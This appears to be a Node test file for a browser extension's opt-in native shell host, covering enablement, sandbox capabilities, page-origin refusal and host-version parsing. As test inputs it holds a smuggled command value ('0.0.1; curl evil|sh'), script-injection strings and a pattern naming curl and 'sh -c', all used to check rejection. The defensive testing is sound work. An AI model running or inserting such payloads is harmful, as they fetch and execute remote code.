// sh-host.test.mjs — the process host from the built worker's side (src/sw/sw-shell.ts): the native port opened only
// when the person turned ml.sh on and named a folder, configured from Settings, the status Settings shows, and the
// shell capabilities the runtime declares. The host is tests/fake-native-host.mjs on the far end of a mocked
// `connectNative`. What no page may reach is in tests/redteam.test.js.

import { test } from "node:test";
import assert from "node:assert/strict";
import { createRequire } from "node:module";
import { fakeNativeHost } from "./fake-native-host.mjs";

const require = createRequire(import.meta.url);
const { loadBackground } = require("./helpers");
const T = { timeout: 30000 };
const HOST = "com.parawanderer.window_ml_host";
const PAGE = Object.freeze({ id: "test", url: "chrome-extension://test/sidebar.html" });
const base = { chatUrl: "http://host/api/chat/completions", apiKey: "sk-test", model: "m", apiFormat: "openai", ocrModel: "" };
const ON = { shellEnabled: true, shellRoots: ["/w/proj"] };
const flush = async (n = 10) => { for (let i = 0; i < n; i++) await new Promise((r) => setTimeout(r, 0)); };

const bg_status = (bg) => status(bg, false);
const status = async (bg, refresh = true, sender = PAGE) => (await bg.send({ type: "SHELL_STATUS", payload: { refresh } }, { ...sender }));
/** The capabilities this runtime declares to an extension page that opens the sessions port. */
async function capabilities(bg) {
    const port = bg.connect("ml-sessions", PAGE);
    port.send({ type: "sessions" });
    await flush();
    return port.messages.find((m) => m.runtime)?.runtime.capabilities;
}

// --- off until the person says so ---

test("off by default: nothing starts the host, and no shell capability is declared", T, async () => {
    const host = fakeNativeHost();
    const bg = loadBackground({ config: base, onNative: host.onNative });
    await flush();
    const r = await status(bg);
    assert.deepEqual([r.data.enabled, r.data.ready, r.data.reason], [false, false, "off"]);
    assert.deepEqual(bg.nativeConnects, [], "the host process was never started");
    const caps = await capabilities(bg);
    assert.equal(caps.shellHost, undefined);
    assert.equal(caps.shellSandboxed, undefined);
    assert.equal(caps.shellContainer, undefined, "no container runner exists");
});

test("on with no workspace folder: refused before the host is started", T, async () => {
    const host = fakeNativeHost();
    const bg = loadBackground({ config: { ...base, shellEnabled: true, shellRoots: ["  "] }, onNative: host.onNative });
    const r = await status(bg);
    assert.deepEqual([r.data.ready, r.data.reason], [false, "no-roots"]);
    assert.deepEqual(bg.nativeConnects, []);
});

// --- connected ---

test("on with a folder: the worker starts the host, says hello, configures it from Settings, and declares the capabilities", T, async () => {
    const host = fakeNativeHost();
    const bg = loadBackground({ config: { ...base, ...ON, shellPath: ["/opt/homebrew/bin"] }, onNative: host.onNative });
    await flush(30);
    assert.deepEqual(bg.nativeConnects, [HOST], "measured once at start, because it is on");
    assert.deepEqual(host.names(), ["hello", "configure"]);
    assert.deepEqual(host.calls[1].args, { roots: ["/w/proj"], sandbox: true, path: ["/opt/homebrew/bin"] });
    const r = await status(bg, false);
    assert.deepEqual([r.data.ready, r.data.sandboxed, r.data.host.version], [true, true, "0.2.0"]);
    const caps = await capabilities(bg);
    assert.deepEqual([caps.shellHost, caps.shellSandboxed, caps.shellContainer], [true, true, undefined]);
    await status(bg);
    assert.deepEqual(bg.nativeConnects, [HOST], "the same settings reuse the open port");
});

test("no sandbox on this machine: ready, but not sandboxed, and the capabilities say so", T, async () => {
    const host = fakeNativeHost({ sandbox: false });
    const bg = loadBackground({ config: { ...base, ...ON }, onNative: host.onNative });
    const r = await status(bg);
    assert.deepEqual([r.data.ready, r.data.sandboxed], [true, false]);
    const caps = await capabilities(bg);
    assert.deepEqual([caps.shellHost, caps.shellSandboxed], [true, undefined]);
});

test("a host that expands `~` declares shellTilde and says so in the status; one that does not declares neither", T, async () => {
    for (const [opts, want] of [[{ tilde: { home: "/Users/fake" } }, true], [{}, undefined]]) {
        const host = fakeNativeHost(opts);
        const bg = loadBackground({ config: { ...base, ...ON }, onNative: host.onNative });
        const r = await status(bg);
        assert.equal(r.data.ready, true);
        assert.equal(r.data.host.tilde, want, JSON.stringify(opts));
        const caps = await capabilities(bg);
        assert.deepEqual([caps.shellHost, caps.shellTilde], [true, want], JSON.stringify(opts));
    }
});

test("the person turned the sandbox off: the host is told, and calls are not sandboxed", T, async () => {
    const host = fakeNativeHost();
    const bg = loadBackground({ config: { ...base, ...ON, shellSandbox: false }, onNative: host.onNative });
    const r = await status(bg);
    assert.equal(host.calls.find((c) => c.call === "configure").args.sandbox, false);
    assert.equal(r.data.sandboxed, false);
});

// --- not there, or not right ---

test("the host is not installed: not ready, and the status says how to install it", T, async () => {
    const bg = loadBackground({ config: { ...base, ...ON } });
    const r = await status(bg);
    assert.deepEqual([r.data.ready, r.data.reason], [false, "not-installed"]);
    assert.match(r.data.error, /Settings, Extension, Advanced, Programs \(ml\.sh\)/, "the refusal names the Settings section");
    assert.doesNotMatch(r.data.error, /wmlhost install|curl|sh -c/, "and carries no command");
    // The address the text carries is one the link renderer accepts: nothing else checks an address written outside agent_api_docs' settings section.
    const { parseAddress } = await import("../src/link-address.ts");
    const address = /`(settings\/[^`]+)`/.exec(r.data.error)?.[1];
    assert.deepEqual(parseAddress(address), { tab: "advanced", section: "shell" });
    assert.equal((await capabilities(bg)).shellHost, undefined);
});

test("a host speaking another protocol, or refusing the folders, is not used", T, async () => {
    const old = fakeNativeHost({ protocol: 2 });
    let r = await status(loadBackground({ config: { ...base, ...ON }, onNative: old.onNative }));
    assert.deepEqual([r.data.ready, r.data.reason], [false, "protocol"]);
    const picky = fakeNativeHost({ refuse: { configure: "BadRoot" } });
    r = await status(loadBackground({ config: { ...base, ...ON }, onNative: picky.onNative }));
    assert.deepEqual([r.data.ready, r.data.reason], [false, "config"]);
    assert.match(r.data.error, /refused the settings/);
});

test("the host exiting closes the session; the next measurement starts it again", T, async () => {
    const host = fakeNativeHost();
    const bg = loadBackground({ config: { ...base, ...ON }, onNative: host.onNative });
    assert.equal((await status(bg)).data.ready, true);
    host.exit("host crashed");
    await flush();
    assert.equal((await status(bg, false)).data.ready, false);
    assert.equal((await status(bg)).data.ready, true);
    assert.deepEqual(bg.nativeConnects, [HOST, HOST]);
});

// --- who may ask ---

test("only an extension page may ask for the status: a content script's SHELL_STATUS is refused and starts nothing", T, async () => {
    const host = fakeNativeHost();
    const bg = loadBackground({ config: { ...base, ...ON, shellEnabled: false }, onNative: host.onNative });
    const r = await status(bg, true, { tab: { id: 9, url: "https://evil.example/" }, url: "https://evil.example/", frameId: 0 });
    assert.equal(r.error, "Refused");
    assert.deepEqual(bg.nativeConnects, []);
    assert.equal((await status(bg)).data.reason, "off", "positive control: the extension page is answered");
});

// --- the installer guide: "Check again" says hello, and the offer ends once a host has answered ---

test("Check again with ml.sh off: one hello, nothing configured, and the host is remembered for the profile", T, async () => {
    const host = fakeNativeHost();
    const bg = loadBackground({ config: base, onNative: host.onNative });
    await flush();
    const before = (await status(bg, false)).data;
    assert.deepEqual([before.hostSeen, before.hostAnswers], [false, undefined], "nothing asked yet: the offer stands");
    const r = await bg.send({ type: "SHELL_STATUS", payload: { probe: true } }, { ...PAGE });
    assert.deepEqual([r.data.hostAnswers, r.data.hostSeen, r.data.ready], [true, true, false], "answered, but ml.sh stays off");
    assert.deepEqual(host.names(), ["hello"], "no configure, no spawn");
    assert.equal(bg.localStore.shellHostSeen, true);
});

test("Check again with no host installed: not answered, nothing stored, the offer stands", T, async () => {
    const bg = loadBackground({ config: base });
    const r = await bg.send({ type: "SHELL_STATUS", payload: { probe: true } }, { ...PAGE });
    assert.deepEqual([r.data.hostAnswers, r.data.hostSeen], [false, false]);
    assert.equal(bg.localStore.shellHostSeen, undefined);
});

test("upgrade: a profile whose storage predates the flag has no host seen, and one that has it keeps it with no hello", T, async () => {
    const old = loadBackground({ config: base, local: { ml_site_always: [] } });
    await flush();
    assert.equal((await status(old, false)).data.hostSeen, false);
    const seen = loadBackground({ config: base, local: { shellHostSeen: true } });
    await flush();
    const r = (await status(seen, false)).data;
    assert.deepEqual([r.hostSeen, r.hostAnswers], [true, undefined], "remembered, and no host process was started to find out");
    assert.deepEqual(seen.nativeConnects, []);
});

test("a page cannot probe: SHELL_STATUS probe from a web page or content script is refused and starts nothing", T, async () => {
    const host = fakeNativeHost();
    const bg = loadBackground({ config: base, onNative: host.onNative });
    for (const sender of [{ id: "test", tab: { id: 3 }, url: "https://evil.example/" }, { id: "test", tab: { id: 3 }, url: "https://evil.example/", origin: "https://evil.example" }]) {
        const r = await bg.send({ type: "SHELL_STATUS", payload: { probe: true } }, sender);
        assert.equal(r?.error, "Refused");
    }
    assert.deepEqual(bg.nativeConnects, []);
});

test("a worker woken by the settings page reports the stored host, not none, before its own storage read has settled", T, async () => {
    const seen = loadBackground({ config: base, local: { shellHostSeen: true } });
    // No flush: the first message is the one that wakes an evicted worker.
    const r = await bg_status(seen);
    assert.equal(r.data.hostSeen, true, "the installer guide must not draw for a person who has a host");
});

// --- the host-version hint: an update is offered only for a host KNOWN to be older than this build's pin ---

const pinned = JSON.parse((await import("node:fs")).readFileSync(new URL("../tools/host-dist.json", import.meta.url), "utf8")).tag.replace(/^v/, "");
const probe = async (bg) => (await bg.send({ type: "SHELL_STATUS", payload: { probe: true } }, { ...PAGE })).data;

test("an older host is offered the update: its parsed version is kept and shown, the pin beside it", T, async () => {
    const bg = loadBackground({ config: base, onNative: fakeNativeHost({ version: "0.0.1" }).onNative });
    const r = await probe(bg);
    assert.deepEqual([r.hostOutdated, r.hostVersion, r.pinnedHostVersion], [true, "0.0.1", pinned]);
    assert.equal(bg.localStore.shellHostVersion, "0.0.1", "stored for the profile, parsed");
});

test("a host equal to the pin, or newer, gets no hint", T, async () => {
    for (const version of [pinned, "999.0.0"]) {
        const bg = loadBackground({ config: base, onNative: fakeNativeHost({ version }).onNative });
        const r = await probe(bg);
        assert.deepEqual([r.hostOutdated, r.hostVersion], [undefined, version], version);
    }
});

test("a version that is not the pin's shape is unknown: no hint, nothing stored, and the raw text appears nowhere in the status", T, async () => {
    for (const version of ["0.0.1-dev", "banana", "0.0", "0.0.1 <script>alert(1)</script>", "v0.0.1"]) {
        const bg = loadBackground({ config: base, local: { shellHostVersion: "0.0.1" }, onNative: fakeNativeHost({ version }).onNative });
        const r = await probe(bg);
        assert.deepEqual([r.hostOutdated, r.hostVersion], [undefined, undefined], version);
        assert.equal(bg.localStore.shellHostVersion, undefined, "an older stored version is cleared, not judged against");
        assert.ok(!JSON.stringify(r).includes(JSON.stringify(version)), `the raw ${version} is not in the answer`);
    }
});

test("upgrade: a profile with only the old shellHostSeen flag has no version, so no hint until the next hello", T, async () => {
    const bg = loadBackground({ config: base, local: { shellHostSeen: true }, onNative: fakeNativeHost({ version: "0.0.1" }).onNative });
    const before = (await status(bg, false)).data;
    assert.deepEqual([before.hostSeen, before.hostVersion, before.hostOutdated], [true, undefined, undefined], "a host was seen, its version is not known");
    assert.deepEqual(bg.nativeConnects, [], "knowing that did not start the host");
    const after = await probe(bg);
    assert.deepEqual([after.hostOutdated, after.hostVersion], [true, "0.0.1"], "the next hello fills it in");
});

test("a stored version that is not the shape is read as unknown, and a stored older one is offered without starting the host", T, async () => {
    const junk = loadBackground({ config: base, local: { shellHostSeen: true, shellHostVersion: "0.0.1; curl evil|sh" } });
    assert.equal((await status(junk, false)).data.hostOutdated, undefined);
    const old = loadBackground({ config: base, local: { shellHostSeen: true, shellHostVersion: "0.0.1" } });
    const r = (await status(old, false)).data;
    assert.deepEqual([r.hostOutdated, r.hostVersion], [true, "0.0.1"]);
    assert.deepEqual(old.nativeConnects, []);
});

test("after the update, Check again re-reads a host that was left running: the offer retires", T, async () => {
    let version = "0.0.1";
    const host = fakeNativeHost({ get version() { return version; } });
    const bg = loadBackground({ config: { ...base, ...ON }, onNative: host.onNative });
    await flush(30);
    assert.equal((await status(bg, false)).data.hostOutdated, true, "connected to the old binary");
    version = pinned;   // the installer replaced the binary
    const r = await probe(bg);
    assert.deepEqual([r.hostOutdated, r.hostVersion], [undefined, pinned], "a fresh hello, not the open port's old one");
});

test("connected with ml.sh on, a host version that does not parse is unknown in the answer (the status the inspector reads is the same object)", T, async () => {
    for (const version of ["banana-7", "0.0.1-dev<script>", "v0.0.1"]) {
        const bg = loadBackground({ config: { ...base, ...ON }, onNative: fakeNativeHost({ version }).onNative });
        await flush(30);
        const r = await status(bg);   // refresh: true goes through connect
        assert.equal(r.data.ready, true);
        assert.equal(r.data.host.version, "unknown", version);
        assert.equal(r.data.hostVersion, undefined);
        assert.ok(!JSON.stringify(r).includes(JSON.stringify(version).slice(1, -1)), `the raw ${version} is not in the SHELL_STATUS answer`);
    }
    const ok = loadBackground({ config: { ...base, ...ON }, onNative: fakeNativeHost({ version: "0.2.0" }).onNative });
    await flush(30);
    assert.equal((await status(ok)).data.host.version, "0.2.0", "a parseable version is shown as parsed");
});
